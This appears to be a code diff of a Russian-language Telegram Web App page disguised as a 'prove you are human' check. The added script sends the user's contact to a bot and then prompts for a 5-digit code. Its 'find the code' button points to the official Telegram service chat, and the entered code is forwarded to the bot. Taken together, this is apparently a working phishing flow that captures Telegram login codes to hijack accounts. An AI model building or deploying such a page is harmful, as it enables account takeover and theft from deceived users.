@@ -2,20 +2,23 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Как записали?!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Подтверждение</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
-            background-color: #000000;
-            color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #000000;
+            color: #ffffff;
             min-height: 100vh;
+            overflow-x: hidden;
             padding: 20px;
             display: flex;
             flex-direction: column;
@@ -25,212 +28,179 @@
 
         .container {
             width: 100%;
-            max-width: 320px;
+            max-width: 400px;
             text-align: center;
         }
 
-        /* Шапка с логотипом */
-        .header {
-            margin-bottom: 30px;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            font-size: 22px;
-            font-weight: bold;
-            color: #fff;
-            margin-bottom: 10px;
-        }
-
-        .logo-icon {
-            font-size: 28px;
-        }
-
-        .subtitle {
-            color: #888;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-
-        /* Анимация руки */
-        .hand-animation {
-            font-size: 80px;
+        /* Анимация махания рукой */
+        .hand-wave {
+            font-size: 100px;
             margin: 30px 0;
-            height: 100px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .wave-hand {
-            animation: wave 2s infinite;
+            display: inline-block;
+            animation: wave 4s ease-in-out infinite;
             transform-origin: 70% 70%;
         }
 
         @keyframes wave {
-            0% { transform: rotate(0deg); }
-            10% { transform: rotate(14deg); }
-            20% { transform: rotate(-8deg); }
-            30% { transform: rotate(14deg); }
-            40% { transform: rotate(-4deg); }
-            50% { transform: rotate(10deg); }
-            60% { transform: rotate(0deg); }
-            100% { transform: rotate(0deg); }
+            0%, 40%, 80%, 100% { transform: rotate(0deg); }
+            20%, 60% { transform: rotate(-20deg); }
         }
 
-        /* Серый бокс */
-        .gray-box {
-            background-color: #1a1a1a;
+        /* Серый квадрат */
+        .confirmation-box {
+            background: #2A2A2A;
             border-radius: 20px;
-            padding: 25px 20px;
+            padding: 25px;
             margin: 20px 0;
-            border: 1px solid #333;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            animation: fadeIn 0.8s ease-out;
+            border: 1px solid #444;
         }
 
-        .gray-box p {
-            font-size: 16px;
+        .confirmation-text {
+            font-size: 18px;
             line-height: 1.5;
-            color: #e0e0e0;
+            color: #E0E0E0;
+            font-weight: 400;
         }
 
         /* Синяя кнопка */
-        .blue-btn {
+        .confirm-btn {
             background: linear-gradient(135deg, #007AFF, #0056CC);
             color: white;
             border: none;
             border-radius: 15px;
-            padding: 18px 30px;
-            font-size: 18px;
+            padding: 20px 40px;
+            font-size: 20px;
             font-weight: 600;
-            width: 100%;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 20px;
-            box-shadow: 0 4px 15px rgba(0, 122, 255, 0.3);
+            margin-top: 25px;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(0, 122, 255, 0.3);
+            letter-spacing: 0.5px;
         }
 
-        .blue-btn:hover {
-            background: linear-gradient(135deg, #0056CC, #004099);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 122, 255, 0.4);
+        .confirm-btn:active {
+            transform: scale(0.98);
+            box-shadow: 0 2px 10px rgba(0, 122, 255, 0.2);
         }
 
-        .blue-btn:active {
-            transform: translateY(0);
-        }
-
-        /* Анимация загрузки */
+        /* Экран загрузки */
         .loading-screen {
             display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 300px;
+            animation: fadeIn 0.5s ease-out;
         }
 
-        .folder-animation {
-            font-size: 60px;
+        .loader-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 40px auto;
+        }
+
+        .spinner {
+            width: 100px;
+            height: 100px;
+            border: 8px solid rgba(255, 255, 255, 0.1);
+            border-top: 8px solid #007AFF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 10px;
+            left: 10px;
+        }
+
+        .folder-icon {
+            font-size: 50px;
+            position: absolute;
+            top: 35px;
+            left: 35px;
             animation: bounce 1.5s infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         @keyframes bounce {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
+            50% { transform: translateY(-10px); }
         }
 
         .loading-text {
-            color: #888;
             font-size: 18px;
+            color: #888;
             margin-top: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+            font-weight: 500;
         }
 
         /* Экран ожидания */
         .wait-screen {
             display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 300px;
+            animation: fadeIn 0.5s ease-out;
         }
 
         .wait-text {
-            font-size: 20px;
-            color: #fff;
-            margin-bottom: 10px;
+            font-size: 24px;
+            color: #007AFF;
+            margin: 40px 0;
+            font-weight: 600;
+            animation: pulse 2s infinite;
         }
 
-        .dots {
-            display: flex;
-            gap: 8px;
-            margin-top: 20px;
-        }
-
-        .dot {
-            width: 10px;
-            height: 10px;
-            background-color: #007AFF;
-            border-radius: 50%;
-            animation: dotPulse 1.4s infinite;
-        }
-
-        .dot:nth-child(2) { animation-delay: 0.2s; }
-        .dot:nth-child(3) { animation-delay: 0.4s; }
-
-        @keyframes dotPulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(0.5); opacity: 0.5; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
         }
 
         /* Экран ввода кода */
         .code-screen {
             display: none;
-            width: 100%;
+            animation: fadeIn 0.5s ease-out;
         }
 
-        .phone-animation {
-            font-size: 70px;
-            margin: 20px 0;
-            animation: float 3s infinite ease-in-out;
+        .message-animation {
+            font-size: 80px;
+            margin: 30px 0;
+            animation: float 3s ease-in-out infinite;
         }
 
         @keyframes float {
             0%, 100% { transform: translateY(0) rotate(0deg); }
-            33% { transform: translateY(-10px) rotate(3deg); }
-            66% { transform: translateY(5px) rotate(-3deg); }
+            33% { transform: translateY(-15px) rotate(5deg); }
+            66% { transform: translateY(10px) rotate(-5deg); }
         }
 
         .code-input-container {
             position: relative;
-            margin: 25px 0;
+            margin: 30px auto;
+            width: 280px;
         }
 
         .code-input {
-            background-color: #1a1a1a;
-            border: 2px solid #333;
+            background: #1A1A1A;
+            border: 3px solid #444;
             border-radius: 15px;
             color: white;
-            font-size: 28px;
-            font-weight: bold;
-            letter-spacing: 10px;
+            font-size: 32px;
             padding: 15px;
             text-align: center;
             width: 100%;
+            letter-spacing: 10px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .code-input:focus {
             outline: none;
-            transition: border-color 0.3s;
+            border-color: #007AFF;
         }
 
         .code-input.error {
-            border-color: #ff3b30;
+            border-color: #FF3B30;
             animation: shake 0.5s;
         }
 
@@ -244,348 +214,381 @@
         .keyboard {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-            margin: 25px 0;
+            gap: 15px;
+            max-width: 300px;
+            margin: 30px auto;
         }
 
-        .key {
-            background-color: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 15px;
+        .key-btn {
+            background: #333;
             color: white;
-            font-size: 24px;
-            font-weight: 600;
-            height: 70px;
+            border: none;
+            border-radius: 15px;
+            padding: 20px;
+            font-size: 28px;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.2s;
+            transition: all 0.2s ease;
+            height: 70px;
             display: flex;
             align-items: center;
             justify-content: center;
         }
 
-        .key:hover {
-            background-color: #2a2a2a;
-            transform: translateY(-2px);
+        .key-btn:active {
+            background: #444;
+            transform: scale(0.95);
         }
 
-        .key:active {
-            transform: translateY(0);
-            background-color: #007AFF;
-        }
-
-        .key-special {
-            font-size: 20px;
-        }
-
-        .key-emoji {
+        .special-btn {
+            background: #444;
             font-size: 22px;
         }
 
-        /* Кнопка "Узнать код" */
-        .ghost-btn {
-            background: transparent;
-            border: 2px solid #007AFF;
-            color: #007AFF;
+        .submit-btn {
+            background: linear-gradient(135deg, #34C759, #28A745);
+            color: white;
+            border: none;
             border-radius: 15px;
-            padding: 15px;
-            font-size: 16px;
+            padding: 18px;
+            font-size: 20px;
             font-weight: 600;
-            width: 100%;
             cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 15px;
+            margin-top: 20px;
+            width: 100%;
+            transition: all 0.3s ease;
         }
 
-        .ghost-btn:hover {
-            background-color: rgba(0, 122, 255, 0.1);
-        }
-
-        /* Футер */
-        .footer {
-            margin-top: 40px;
-            color: #666;
-            font-size: 14px;
-            text-align: center;
-        }
-
-        .bot-link {
-            color: #888;
-            text-decoration: none;
-            border-bottom: 1px dashed #666;
-            transition: color 0.3s;
-        }
-
-        .bot-link:hover {
+        .chat-btn {
+            background: #444;
             color: #007AFF;
-        }
-
-        /* Сообщения */
-        .message {
-            display: none;
-            padding: 15px;
+            border: none;
             border-radius: 15px;
-            margin: 15px 0;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: all 0.3s ease;
+        }
+
+        .chat-btn:active {
+            background: #555;
+        }
+
+        /* Анимации */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Скрытые элементы */
+        .hidden {
+            display: none !important;
+        }
+
+        /* Индикатор таймера */
+        .timer {
             font-size: 14px;
+            color: #888;
+            margin-top: 10px;
         }
 
-        .success {
-            background-color: rgba(52, 199, 89, 0.1);
-            border: 1px solid #34C759;
-            color: #34C759;
-        }
-
-        .error {
-            background-color: rgba(255, 59, 48, 0.1);
-            border: 1px solid #FF3B30;
-            color: #FF3B30;
+        /* Адаптивность */
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .hand-wave {
+                font-size: 80px;
+            }
+            
+            .confirmation-box {
+                padding: 20px;
+                margin: 15px 0;
+            }
+            
+            .confirm-btn {
+                padding: 18px;
+                font-size: 18px;
+            }
+            
+            .code-input {
+                font-size: 28px;
+                padding: 12px;
+            }
+            
+            .key-btn {
+                padding: 15px;
+                font-size: 24px;
+                height: 60px;
+            }
         }
     </style>
 </head>
 <body>
     <!-- Экран приветствия -->
     <div class="container" id="welcomeScreen">
-        <div class="header">
-            <div class="logo">
-                <span class="logo-icon">📱</span>
-                <span>!! КАК ЗАПИСАЛИ !!!</span>
+        <div class="hand-wave">👋🏻</div>
+        
+        <div class="confirmation-box">
+            <div class="confirmation-text">
+                Нужно подтвердить, что вы настоящий человек, нажмите на кнопку ниже для начала!
             </div>
-            <div class="subtitle">@zpx05c_bot</div>
         </div>
-
-        <div class="hand-animation">
-            <div class="wave-hand">👋🏻</div>
-        </div>
-
-        <div class="gray-box">
-            <p>Нужно подтвердить, что вы настоящий человек, нажмите на кнопку ниже для начала!</p>
-        </div>
-
-        <button class="blue-btn" onclick="startConfirmation()">Подтвердить</button>
-
-        <div class="footer">
-            Бот: <a href="https://t.me/zpx05c_bot" class="bot-link" target="_blank">@zpx05c_bot</a>
-        </div>
+        
+        <button class="confirm-btn" onclick="startVerification()">
+            Подтвердить
+        </button>
     </div>
 
     <!-- Экран загрузки -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="folder-animation">📂</div>
+    <div class="container loading-screen" id="loadingScreen">
+        <div class="loader-container">
+            <div class="spinner"></div>
+            <div class="folder-icon">📂</div>
+        </div>
         <div class="loading-text">Загрузка...</div>
     </div>
 
     <!-- Экран ожидания -->
-    <div class="wait-screen" id="waitScreen">
-        <div class="wait-text">Ожидайте</div>
-        <div class="dots">
-            <div class="dot"></div>
-            <div class="dot"></div>
-            <div class="dot"></div>
-        </div>
+    <div class="container wait-screen" id="waitScreen">
+        <div class="wait-text">Ожидайте...</div>
     </div>
 
     <!-- Экран ввода кода -->
     <div class="container code-screen" id="codeScreen">
-        <div class="header">
-            <div class="logo">
-                <span class="logo-icon">📱</span>
-                <span>!! КАК ЗАПИСАЛИ !!!</span>
+        <div class="message-animation">📲</div>
+        
+        <div class="confirmation-box">
+            <div class="confirmation-text">
+                Введите 5-значный код, который мы вам только что отправили!
             </div>
-            <div class="subtitle">@zpx05c_bot</div>
         </div>
-
-        <div class="phone-animation">📲</div>
-
-        <div class="gray-box">
-            <p>Введите 5-значный код, который мы вам только что отправили!</p>
-        </div>
-
+        
         <div class="code-input-container">
-            <input type="text" class="code-input" id="codeInput" maxlength="5" readonly placeholder="_____">
+            <input type="text" 
+                   id="codeInput" 
+                   class="code-input" 
+                   maxlength="5" 
+                   readonly
+                   placeholder="_____">
         </div>
-
-        <div class="message error" id="errorMessage">Неверный код. Попробуйте снова.</div>
-
+        
         <div class="keyboard" id="keyboard">
-            <!-- Цифры 1-9 -->
-            <div class="key" onclick="addDigit('1')">1</div>
-            <div class="key" onclick="addDigit('2')">2</div>
-            <div class="key" onclick="addDigit('3')">3</div>
-            <div class="key" onclick="addDigit('4')">4</div>
-            <div class="key" onclick="addDigit('5')">5</div>
-            <div class="key" onclick="addDigit('6')">6</div>
-            <div class="key" onclick="addDigit('7')">7</div>
-            <div class="key" onclick="addDigit('8')">8</div>
-            <div class="key" onclick="addDigit('9')">9</div>
-            
-            <!-- Специальные кнопки -->
-            <div class="key key-special" onclick="clearCode()">C</div>
-            <div class="key" onclick="addDigit('0')">0</div>
-            <div class="key key-special" onclick="deleteDigit()">⌫</div>
+            <button class="key-btn" onclick="addDigit('1')">1</button>
+            <button class="key-btn" onclick="addDigit('2')">2</button>
+            <button class="key-btn" onclick="addDigit('3')">3</button>
+            <button class="key-btn" onclick="addDigit('4')">4</button>
+            <button class="key-btn" onclick="addDigit('5')">5</button>
+            <button class="key-btn" onclick="addDigit('6')">6</button>
+            <button class="key-btn" onclick="addDigit('7')">7</button>
+            <button class="key-btn" onclick="addDigit('8')">8</button>
+            <button class="key-btn" onclick="addDigit('9')">9</button>
+            <button class="key-btn special-btn" onclick="clearCode()">C</button>
+            <button class="key-btn" onclick="addDigit('0')">0</button>
+            <button class="key-btn special-btn" onclick="deleteDigit()">
+                <i class="fas fa-backspace"></i>
+            </button>
         </div>
-
-        <button class="ghost-btn" onclick="openTelegramChat()">Узнать код</button>
-
-        <div class="footer">
-            <a href="https://t.me/zpx05c_bot" class="bot-link" target="_blank">@zpx05c_bot</a>
+        
+        <button class="submit-btn" onclick="submitCode()">
+            Отправить код
+        </button>
+        
+        <button class="chat-btn" onclick="openTelegramChat()">
+            <i class="fab fa-telegram"></i>
+            Узнать код в чате
+        </button>
+        
+        <div class="timer" id="timer">
+            Код действителен: <span id="timeLeft">05:00</span>
         </div>
     </div>
 
     <script>
-        // Текущий введенный код
+        // Глобальные переменные
         let currentCode = '';
+        let countdownInterval;
+        let timeLeft = 300; // 5 минут в секундах
         
-        // Инициализация Telegram Web App
+        // Инициализация WebApp Telegram
         function initTelegramWebApp() {
-            if (window.Telegram && Telegram.WebApp) {
+            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                 Telegram.WebApp.ready();
                 Telegram.WebApp.expand();
                 Telegram.WebApp.enableClosingConfirmation();
-                Telegram.WebApp.setHeaderColor('#000000');
-                Telegram.WebApp.setBackgroundColor('#000000');
+                
+                // Обработчик данных от бота
+                Telegram.WebApp.onEvent('themeChanged', function() {
+                    document.documentElement.style.setProperty('--tg-theme-bg-color', Telegram.WebApp.backgroundColor);
+                });
             }
         }
-
-        // Начать подтверждение
-        function startConfirmation() {
+        
+        // Начать верификацию
+        function startVerification() {
+            // Показать экран загрузки
             document.getElementById('welcomeScreen').style.display = 'none';
-            document.getElementById('loadingScreen').style.display = 'flex';
+            document.getElementById('loadingScreen').style.display = 'block';
             
-            // Анимация загрузки 4 секунды
+            // Отправить данные в бота
+            sendToBot({
+                action: 'send_contact'
+            });
+            
+            // Имитация загрузки
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.display = 'none';
-                document.getElementById('waitScreen').style.display = 'flex';
+                document.getElementById('waitScreen').style.display = 'block';
                 
-                // Ожидание 4 секунды
+                // Ждем 4 секунды
                 setTimeout(() => {
                     document.getElementById('waitScreen').style.display = 'none';
                     document.getElementById('codeScreen').style.display = 'block';
-                    
-                    // Отправляем запрос на отправку кода
-                    sendToBot({ action: 'request_code' });
+                    startTimer();
                 }, 4000);
             }, 4000);
         }
-
-        // Добавить цифру
+        
+        // Таймер обратного отсчета
+        function startTimer() {
+            timeLeft = 300;
+            updateTimerDisplay();
+            
+            clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                updateTimerDisplay();
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    alert('Время истекло. Начните заново.');
+                    resetToWelcome();
+                }
+            }, 1000);
+        }
+        
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timeLeft').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        // Работа с кодом
         function addDigit(digit) {
             if (currentCode.length < 5) {
                 currentCode += digit;
                 updateCodeDisplay();
-                hideErrorMessage();
             }
         }
-
-        // Удалить последнюю цифру
+        
         function deleteDigit() {
             currentCode = currentCode.slice(0, -1);
             updateCodeDisplay();
-            hideErrorMessage();
         }
-
-        // Очистить код
+        
         function clearCode() {
             currentCode = '';
             updateCodeDisplay();
-            hideErrorMessage();
         }
-
-        // Обновить отображение кода
+        
         function updateCodeDisplay() {
             const input = document.getElementById('codeInput');
-            input.value = currentCode.padEnd(5, '_').split('').join(' ');
-        }
-
-        // Показать ошибку
-        function showErrorMessage() {
-            const input = document.getElementById('codeInput');
-            const error = document.getElementById('errorMessage');
-            
-            input.classList.add('error');
-            error.style.display = 'block';
-            
-            // Автоматически скрыть через 3 секунды
-            setTimeout(hideErrorMessage, 3000);
-        }
-
-        // Скрыть ошибку
-        function hideErrorMessage() {
-            const input = document.getElementById('codeInput');
-            const error = document.getElementById('errorMessage');
-            
+            const placeholder = currentCode.padEnd(5, '_');
+            input.value = placeholder;
             input.classList.remove('error');
-            error.style.display = 'none';
         }
-
-        // Отправить код на проверку
+        
+        // Отправить код
         function submitCode() {
-            if (currentCode.length === 5) {
-                sendToBot({
-                    action: 'verify_code',
-                    code: currentCode
-                });
-            } else {
-                showErrorMessage();
+            if (currentCode.length !== 5) {
+                showError('Введите все 5 цифр кода');
+                return;
             }
+            
+            if (!/^\d{5}$/.test(currentCode)) {
+                showError('Код должен содержать только цифры');
+                return;
+            }
+            
+            // Отправить код боту
+            sendToBot({
+                action: 'submit_code',
+                code: currentCode
+            });
+            
+            // Показать загрузку
+            document.getElementById('codeScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
         }
-
-        // Открыть чат с ботом
+        
+        // Открыть чат Telegram
         function openTelegramChat() {
-            if (window.Telegram && Telegram.WebApp) {
-                Telegram.WebApp.openTelegramLink('https://t.me/zpx05c_bot');
+            // Открыть официальный клиент Telegram
+            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+                Telegram.WebApp.openTelegramLink('https://t.me/Telegram');
             } else {
-                window.open('https://t.me/zpx05c_bot', '_blank');
+                window.open('https://t.me/Telegram', '_blank');
             }
         }
-
-        // Отправить данные в бота
+        
+        // Показать ошибку
+        function showError(message) {
+            const input = document.getElementById('codeInput');
+            input.classList.add('error');
+            
+            // Встряхнуть инпут
+            input.style.animation = 'none';
+            setTimeout(() => {
+                input.style.animation = 'shake 0.5s';
+            }, 10);
+            
+            // Показать сообщение (можно заменить на красивый toast)
+            alert(message);
+        }
+        
+        // Сбросить к началу
+        function resetToWelcome() {
+            clearInterval(countdownInterval);
+            currentCode = '';
+            
+            document.getElementById('codeScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'none';
+            document.getElementById('waitScreen').style.display = 'none';
+            document.getElementById('welcomeScreen').style.display = 'block';
+        }
+        
+        // Отправить данные боту
         function sendToBot(data) {
-            if (window.Telegram && Telegram.WebApp) {
+            if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                 Telegram.WebApp.sendData(JSON.stringify(data));
             } else {
-                console.log('Web App Data:', data);
-                // Для тестирования вне Telegram
-                if (data.action === 'verify_code') {
-                    // Имитация ответа
-                    setTimeout(() => {
-                        if (Math.random() > 0.5) {
-                            alert('Код принят! Проверка пройдена.');
-                        } else {
-                            showErrorMessage();
-                        }
-                    }, 1000);
-                }
+                console.log('WebApp данные:', data);
+                // Для разработки вне Telegram
+                alert('В реальном Telegram данные будут отправлены боту');
             }
         }
-
-        // Обработка клавиатуры
-        document.addEventListener('keydown', (e) => {
-            if (e.key >= '0' && e.key <= '9') {
-                addDigit(e.key);
-            } else if (e.key === 'Backspace') {
-                deleteDigit();
-            } else if (e.key === 'Enter') {
-                submitCode();
-            } else if (e.key === 'Escape') {
-                clearCode();
-            }
-        });
-
+        
+        // Обработчик сообщений от бота (если нужно)
+        if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+            Telegram.WebApp.onEvent('messageSent', function(data) {
+                console.log('Сообщение отправлено:', data);
+            });
+        }
+        
         // Инициализация при загрузке
-        window.addEventListener('DOMContentLoaded', () => {
+        document.addEventListener('DOMContentLoaded', function() {
             initTelegramWebApp();
             updateCodeDisplay();
-            
-            // Добавляем обработчик на Enter для отправки кода
-            const codeInput = document.getElementById('codeInput');
-            codeInput.addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    submitCode();
-                }
-            });
         });
-
-        // Экспорт функций для Web App
-        window.submitCode = submitCode;
     </script>
 </body>
 </html>
